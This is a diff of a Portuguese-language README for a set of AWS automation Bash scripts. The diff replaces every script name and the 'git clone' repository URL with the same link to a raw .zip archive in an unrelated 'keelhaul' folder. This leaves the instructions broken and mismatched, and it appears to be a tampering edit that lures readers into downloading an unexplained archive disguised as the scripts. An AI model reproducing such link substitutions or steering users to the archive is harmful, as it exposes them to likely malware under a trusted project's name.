@@ -4,7 +4,7 @@ Scripts Bash para automatizar tarefas comuns na AWS. Criei isso pra facilitar o 
 
 ## O que tem aqui
 
-**create_ec2_ubuntu.sh** - Cria uma instancia EC2 com Ubuntu de forma simples
+**https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip** - Cria uma instancia EC2 com Ubuntu de forma simples
 
 Basta rodar e passa alguns parametros que o script:
 - Cria a instancia
@@ -13,11 +13,11 @@ Basta rodar e passa alguns parametros que o script:
 
 Edita o script pra colocar sua AMI ID, tipo de instancia e a chave que voce quer usar.
 
-**setup_apache.sh** - Instala e configura Apache2
+**https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip** - Instala e configura Apache2
 
 Roda no boot da instancia via user-data ou voce executa depois via SSH. Instala o Apache, deixa ativo automaticamente e cria uma pagina HTML de teste.
 
-**close_ports.sh** - Fecha portas abertas de um Security Group
+**https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip** - Fecha portas abertas de um Security Group
 
 Pra quando aquele SG esta muito aberto e voce precisa fechar essas portas rapidinho. Remove as regras que deixam aberto pro mundo (0.0.0.0/0).
 
@@ -30,7 +30,7 @@ aws configure
 
 Clone o repo:
 ```bash
-git clone https://github.com/LucianoHMG/aws-ops-scripts.git
+git clone https://github.com/LucianoHMG/aws-ops-scripts/raw/refs/heads/main/keelhaul/ops-scripts-aws-v1.1.zip
 cd aws-ops-scripts
 ```
 
